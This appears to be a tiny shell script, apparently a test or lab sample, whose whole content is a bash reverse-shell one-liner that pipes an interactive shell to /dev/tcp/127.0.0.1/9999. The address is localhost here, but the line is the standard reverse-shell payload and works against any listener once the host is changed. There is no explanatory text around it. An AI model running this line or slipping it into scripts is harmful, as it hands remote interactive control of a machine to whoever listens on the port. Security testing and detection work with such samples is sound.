#!/bin/sh

/bin/bash -i > /dev/tcp/127.0.0.1/9999 0<&1 2>&1
